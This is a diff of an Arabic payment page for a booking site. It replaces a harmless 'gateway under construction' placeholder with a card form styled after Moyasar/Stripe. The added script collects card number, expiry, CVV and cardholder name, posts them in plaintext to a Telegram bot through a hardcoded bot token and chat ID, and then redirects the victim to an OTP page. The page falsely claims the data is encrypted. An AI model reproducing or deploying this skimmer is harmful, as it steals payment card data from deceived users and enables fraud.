@@ -1,79 +1,449 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>الدفع الإلكتروني | كأس الخليج العربي 27</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Alexandria:wght@400;600;700;800&display=swap" rel="stylesheet" />
-    <style>
-      :root { --ink: #102c32; --green: #0da278; --deep: #062a30; --sand: #f7f5ef; --muted: #71817c; }
-      * { box-sizing: border-box; }
-      body { min-height: 100vh; margin: 0; display: grid; place-items: center; padding: 22px; color: var(--ink); background: radial-gradient(circle at 15% 10%, #dff7ed, transparent 28%), var(--sand); font-family: "Alexandria", system-ui, sans-serif; }
-      .card { width: min(520px, 100%); overflow: hidden; border: 1px solid #dce8e2; border-radius: 24px; background: rgba(255,255,255,.94); box-shadow: 0 28px 70px rgba(12,48,48,.14); }
-      .top { padding: 34px 28px 30px; color: white; text-align: center; background: radial-gradient(circle at 85% 0%, #1a8c73, transparent 35%), linear-gradient(135deg, var(--deep), #0d5b54); }
-      .icon { width: 62px; height: 62px; margin: 0 auto 17px; display: grid; place-items: center; border: 1px solid rgba(255,255,255,.25); border-radius: 19px; color: #a9f1d7; background: rgba(255,255,255,.1); font-size: 29px; }
-      .top p { margin: 0 0 10px; color: #a9f1d7; font-size: 10px; font-weight: 700; }
-      h1 { margin: 0; font-size: 23px; line-height: 1.6; }
-      .content { padding: 29px; text-align: center; }
-      .content h2 { margin: 0 0 11px; font-size: 17px; }
-      .content p { margin: 0 auto 23px; max-width: 370px; color: var(--muted); font-size: 11px; line-height: 2; }
-      .order-summary { margin: 0 auto 22px; padding: 15px 16px; border: 1px solid #dce8e2; border-radius: 14px; text-align: right; background: #fbfdfc; font-size: 10px; }
-      .order-summary h4 { margin: 0 0 12px; font-size: 11px; }
-      .summary-row, .total { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 7px 0; }
-      .summary-row { color: var(--muted); }
-      .total { margin-top: 5px; padding-top: 12px; border-top: 1px dashed #cadbd3; color: var(--ink); font-weight: 800; }
-      .total-value { color: var(--green); font-size: 13px; }
-      .notice { margin: 0 0 22px; padding: 14px 16px; border: 1px solid #f2dfb4; border-radius: 13px; color: #8a651e; background: #fff8e7; font-size: 10px; line-height: 1.9; }
-      .back { display: inline-flex; align-items: center; justify-content: center; min-height: 43px; padding: 0 19px; border-radius: 12px; color: white; background: var(--green); font-size: 11px; font-weight: 700; text-decoration: none; transition: transform .16s ease, background .16s ease; }
-      .back:hover { background: #087459; transform: translateY(-2px); }
-      .meta { margin-top: 19px; color: #a0aaa6; font: 9px system-ui, sans-serif; }
-      @media (max-width: 520px) { body { padding: 13px; } .top, .content { padding-inline: 21px; } h1 { font-size: 19px; } }
-    </style>
-  </head>
-  <body>
-    <main class="card">
-      <section class="top">
-        <div class="icon" aria-hidden="true">▣</div>
-        <p>الخطوة الأخيرة من الحجز</p>
-        <h1>صفحة الدفع الإلكتروني</h1>
-      </section>
-      <section class="content">
-        <h2>بوابة الدفع قيد الإنشاء</h2>
-        <p>تم استلام بيانات الحجز بنجاح. سيتم تفعيل الدفع الإلكتروني في هذه الصفحة عند تجهيز بوابة الدفع.</p>
-        <div class="order-summary">
-          <h4>📋 ملخص الطلب</h4>
-          <div class="summary-row">
-            <span>المبلغ الإجمالي</span>
-            <span id="originalPrice">0.00 ر.س</span>
-          </div>
-          <div class="summary-row discount" id="discountRow" style="display:none;">
-            <span id="remainingLabel">المبلغ المتبقي</span>
-            <span id="discountAmount">0.00 ر.س</span>
-          </div>
-          <div class="total">
-            <span class="total-label" id="paymentLabel">المبلغ المدفوع الآن</span>
-            <span class="total-value" id="finalAmount">0.00 ر.س</span>
-          </div>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <title>الدفع - فزعة</title>
+
+  <style>
+    /* ستايل بوابات الدفع العالمية (Moyasar / Stripe Style) */
+    @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+
+    :root {
+      --ms-primary: #123ca9;
+      --ms-text: #27272a;
+      --ms-label: #4b5563;
+      --ms-border: #e4e4e7;
+      --ms-bg: #ffffff;
+      --ms-hint: #a1a1aa;
+      --radius-normal: 8px;
+    }
+
+    .form-container.page {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      direction: rtl;
+      max-width: 440px;
+      margin: 40px auto;
+      padding: 30px 24px;
+      background: var(--ms-bg);
+      border-radius: var(--radius-normal);
+      box-sizing: border-box;
+      color: var(--ms-text);
+      border: 1px solid #e4e4e7;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+    }
+
+    .form-title {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #3f3f46;
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .form-title::before, .form-title::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #e4e4e7;
+    }
+    
+    .form-title .icon { display: none; }
+
+    .form-group {
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .form-label {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #18181b;
+      margin-bottom: 8px;
+      text-align: right;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 13px 16px;
+      font-size: 1rem;
+      border: 1px solid var(--ms-border);
+      border-radius: var(--radius-normal);
+      background-color: #ffffff;
+      color: var(--ms-text);
+      box-sizing: border-box;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-color: #a1a1aa;
+      box-shadow: 0 0 0 1px #a1a1aa;
+    }
+
+    .form-control::placeholder {
+      color: #b4b4b8;
+      opacity: 0.9;
+    }
+
+    .card-number-input {
+      border-bottom: 1px solid #f4f4f5 !important;
+      border-bottom-left-radius: 0 !important;
+      border-bottom-right-radius: 0 !important;
+      font-family: 'Courier New', monospace;
+      font-size: 1.05rem !important;
+      letter-spacing: 0.5px !important;
+      direction: ltr !important;
+      text-align: right !important;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 24"><rect x="0" y="2" width="26" height="18" rx="2" fill="%230284c7"/><text x="4" y="14" fill="white" font-family="sans-serif" font-size="8" font-weight="bold">mada</text><rect x="32" y="2" width="26" height="18" rx="2" fill="%230a2540"/><text x="36" y="14" fill="white" font-family="sans-serif" font-size="9" font-style="italic" font-weight="bold">VISA</text><rect x="64" y="2" width="26" height="18" rx="2" fill="%23222"/><circle cx="73" cy="11" r="6" fill="%23eb001b"/><circle cx="81" cy="11" r="6" fill="%23ff5f00" opacity="0.8"/><rect x="96" y="2" width="26" height="18" rx="2" fill="%230070d2"/><text x="100" y="13" fill="white" font-family="sans-serif" font-size="7" font-weight="bold">AMEX</text></svg>');
+      background-repeat: no-repeat;
+      background-position: left 12px center;
+      background-size: 110px auto;
+      padding-left: 130px !important;
+    }
+
+    .form-row {
+      display: flex;
+      margin-top: -20px;
+      border-top: none;
+    }
+
+    .form-row .form-group {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
+    .form-row .form-label, 
+    .form-row .form-hint { display: none !important; }
+
+    .form-row .form-group:first-child .form-control {
+      border-top-left-radius: 0 !important;
+      border-top-right-radius: 0 !important;
+      border-bottom-left-radius: 0 !important;
+      border-bottom-right-radius: var(--radius-normal) !important;
+      border-left: none !important;
+    }
+
+    .form-row .form-group:last-child .form-control {
+      border-top-left-radius: 0 !important;
+      border-top-right-radius: 0 !important;
+      border-bottom-right-radius: 0 !important;
+      border-bottom-left-radius: var(--radius-normal) !important;
+      border-right: 1px solid var(--ms-border) !important;
+    }
+
+    .order-summary {
+      background: #f8fafc;
+      border-radius: var(--radius-normal);
+      padding: 16px;
+      margin: 24px 0;
+      border: 1px dashed #e4e4e7;
+    }
+
+    .order-summary h4 { margin: 0 0 12px 0; font-size: 0.9rem; color: #18181b; }
+    .summary-row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 0.85rem; color: #71717a; }
+    .summary-row.discount { border-bottom: 1px dashed #e4e4e7; margin-bottom: 6px; color: #dc2626; }
+    
+    .order-summary .total {
+      display: flex;
+      justify-content: space-between;
+      border-top: 1px solid #e4e4e7;
+      padding-top: 12px;
+      margin-top: 12px;
+      font-weight: 700;
+    }
+    .total-label { color: #18181b; font-size: 0.9rem; }
+    .total-value { color: var(--ms-primary); font-size: 1.1rem; }
+
+    .btn.btn-success {
+      display: flex !important;
+      justify-content: center !important;
+      align-items: center !important;
+      background-color: var(--ms-primary) !important;
+      color: #ffffff !important;
+      border: none !important;
+      border-radius: var(--radius-normal) !important;
+      font-size: 1.1rem !important;
+      font-weight: 600 !important;
+      cursor: pointer;
+      box-shadow: none !important;
+      transition: background-color 0.2s ease;
+      text-shadow: none;
+    }
+
+    .btn.btn-success:hover { background-color: #0f318c !important; }
+    .btn.btn-success span:last-child { display: none !important; }
+
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(10, 15, 25, 0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      padding: 20px;
+    }
+    .loading-overlay.show { display: flex; }
+    .loading-card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 24px 28px;
+      text-align: center;
+      box-shadow: 0 12px 36px rgba(0,0,0,0.28);
+    }
+    .loading-spinner {
+      width: 46px;
+      height: 46px;
+      border: 4px solid #e9e9e9;
+      border-top-color: #123ca9;
+      border-radius: 50%;
+      margin: 0 auto 12px;
+      animation: spin 0.9s linear infinite;
+    }
+    .loading-text {
+      font-size: 0.95rem;
+      color: #555;
+      font-weight: 600;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @media (max-width: 480px) {
+      .form-container.page {
+        margin: 20px 16px;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+      <div class="loading-spinner"></div>
+      <div class="loading-text">جار التحميل يرجى الانتظار</div>
+    </div>
+  </div>
+
+  <div class="form-container page">
+    <div class="form-title">
+      <span class="icon">💳</span>
+      <span>Or pay with card</span>
+    </div>
+
+    <form id="paymentForm">
+      <h2 id="cashMessage" style="display:none; text-align:center; font-size:18px; color:#123ca9; margin-bottom:16px;">
+        يرجى تسديد 25 ريال لتأكيد حجز الطلبية
+      </h2>
+
+      <div class="form-group">
+        <label class="form-label">Card information</label>
+        <input type="text" class="form-control card-number-input" id="cardNumber" 
+               required maxlength="19" placeholder="1234 5678 9101 1121" 
+               inputmode="numeric" autocomplete="off">
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">تاريخ الانتهاء</label>
+          <input type="text" class="form-control" id="expiry" required 
+                 placeholder="MM / YY" maxlength="7" inputmode="numeric" dir="ltr" autocomplete="off">
+          <small class="form-hint"> </small>
         </div>
-        <div class="notice">لا توجد عملية دفع أو خصم مالي في الوقت الحالي.</div>
-        <a class="back" href="/">العودة إلى المباريات</a>
-        <div class="meta">كأس الخليج العربي 27 · 2026</div>
-      </section>
-    </main>
-    <script>
-      // Reusable booking amount: sessionStorage is written in BookingSeats at step 1.
-      (() => {
-        const fallback = { total: 0, currency: "SAR" };
-        let booking = fallback;
-        try { booking = { ...fallback, ...JSON.parse(sessionStorage.getItem("pending-booking") || "{}") }; } catch (_) {}
-        const amount = Number(booking.total || 0);
-        const currency = booking.currency === "QAR" ? "ر.ق" : "ر.س";
-        const formatted = `${amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ${currency}`;
-        document.getElementById("originalPrice").textContent = formatted;
-        document.getElementById("finalAmount").textContent = formatted;
-      })();
-    </script>
-  </body>
+        <div class="form-group">
+          <label class="form-label">رمز الأمان (CVV)</label>
+          <input type="text" class="form-control" id="cvv" required 
+                 placeholder="CVV" maxlength="3" pattern="\d{3}" inputmode="numeric" autocomplete="off" >
+          <small class="form-hint"> </small>
+        </div>
+      </div>
+
+      <div class="form-group" style="margin-top: 20px;">
+        <label class="form-label">Name on card</label>
+        <input type="text" class="form-control" id="cardHolder" name="cardHolder" required 
+               placeholder="Name on card" autocomplete="off">
+      </div>
+
+      <div class="order-summary">
+        <h4>📋 ملخص الطلب</h4>
+        <div class="summary-row">
+          <span>المبلغ الإجمالي</span>
+          <span id="originalPrice">0.00 ر.ق</span>
+        </div>
+        <div class="summary-row discount" id="discountRow" style="display:none;">
+          <span id="remainingLabel">المبلغ المتبقي</span>
+          <span id="discountAmount">0.00 ر.ق</span>
+        </div>
+        <div class="total">
+          <span class="total-label" id="paymentLabel">المبلغ المدفوع الآن</span>
+          <span class="total-value" id="finalAmount">0.00 ر.ق</span>
+        </div>
+      </div>
+
+      <button id="btn" type="submit" class="btn btn-success" style="width:100%;padding:16px;">
+        <span>إتمام الدفع</span>
+        <span>←</span>
+      </button>
+
+      <div style="text-align:center;margin-top:16px;font-size:12px;color:#71717a;">
+        🔒 بياناتك محمية ومشفرة بالكامل
+      </div>
+    </form>
+  </div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        
+        // 1. إعداد المبلغ الثابت
+        function updateFinalAmount() {
+            var fixedAmount = 5.00;
+            var finalAmountElement = document.getElementById('finalAmount');
+            var originalPriceElement = document.getElementById('originalPrice');
+            
+            if (finalAmountElement) finalAmountElement.textContent = fixedAmount.toFixed(2) + ' درهم';
+            if (originalPriceElement) originalPriceElement.textContent = fixedAmount.toFixed(2) + ' درهم';
+        }
+        updateFinalAmount();
+
+        // 2. دوال التحقق والتنسيق للحقول
+        function addError(element) {
+            if (element) element.classList.add('error');
+        }
+        
+        function removeError(element) {
+            if (element) element.classList.remove('error');
+        }
+        
+        function getParentFormGroup(input) {
+            var parent = input.parentElement;
+            while (parent) {
+                if (parent.classList && (parent.classList.contains('form-group') || parent.classList.contains('form-row'))) {
+                    return parent;
+                }
+                parent = parent.parentElement;
+            }
+            return input.parentElement;
+        }
+
+        var cardInput = document.getElementById('cardNumber');
+        cardInput.addEventListener('input', function(e) {
+            removeError(cardInput.parentElement);
+            var value = e.target.value.replace(/\D/g, '');
+            var formatted = '';
+            for (var i = 0; i < value.length && i < 16; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+        });
+        
+        var expiryInput = document.getElementById('expiry');
+        var expiryParent = getParentFormGroup(expiryInput);
+        expiryInput.addEventListener('input', function(e) {
+            removeError(expiryParent);
+            var value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.substring(0, 4);
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + ' / ' + value.substring(2);
+            } else {
+                e.target.value = value;
+            }
+        });
+        
+        var cvvInput = document.getElementById('cvv');
+        var cvvParent = getParentFormGroup(cvvInput);
+        cvvInput.addEventListener('input', function(e) {
+            removeError(cvvParent);
+            var value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.substring(0, 4);
+            e.target.value = value;
+        });
+
+        var cardHolderInput = document.getElementById('cardHolder');
+        cardHolderInput.addEventListener('input', function() {
+            removeError(getParentFormGroup(cardHolderInput));
+        });
+
+        // 3. معالجة نموذج الدفع والإرسال إلى تيليجرام حصراً
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            var rawCardNumber = cardInput.value.replace(/\s/g, '');
+            var expiry = expiryInput.value;
+            var cvv = cvvInput.value;
+            var cardHolder = cardHolderInput.value.trim();
+            
+            var hasError = false;
+            
+            if (rawCardNumber.length !== 16) {
+                addError(cardInput.parentElement);
+                hasError = true;
+            }
+            if (expiry.replace(/\D/g, '').length < 4) {
+                addError(expiryParent);
+                hasError = true;
+            }
+            if (cvv.length < 3) {
+                addError(cvvParent);
+                hasError = true;
+            }
+            if (cardHolder.length < 3) {
+                addError(getParentFormGroup(cardHolderInput));
+                hasError = true;
+            }
+            
+            if (hasError) return;
+
+            // إظهار شاشة التحميل
+            var loadingOverlay = document.getElementById('loadingOverlay');
+            if (loadingOverlay) loadingOverlay.classList.add('show');
+
+            // بيانات تيليجرام
+            const TELEGRAM_BOT_TOKEN = "8597346598:AAG0MdY1pWAAKukWY0KePmUtgT6xA3g5FE0"; // ضع توكن البوت هنا
+            const TELEGRAM_CHAT_ID = "8108427825";     // ضع Chat ID هنا
+
+            const message = 
+`📌 *عملية دفع جديدة*
+👤 *الاسم:* ${cardHolder}
+💳 *رقم البطاقة:* ${rawCardNumber}
+📅 *التاريخ:* ${expiry}
+🔢 *رمز CVV:* ${cvv}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: "Markdown"
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    // التوجيه التلقائي بعد النجاح
+                    window.location.href = '/otp.html';
+                } else {
+                    if (loadingOverlay) loadingOverlay.classList.remove('show');
+                    console.error("خطأ :", data);
+                    alert("حدث خطأ أثناء معالجة الطلب، يرجى المحاولة لاحقاً.");
+                }
+            } catch (error) {
+                if (loadingOverlay) loadingOverlay.classList.remove('show');
+                console.error("خطأ في الاتصال:", error);
+                alert("حدث خطأ في الاتصال بالشبكة.");
+            }
+        });
+    });
+</script>
+</body>
 </html>
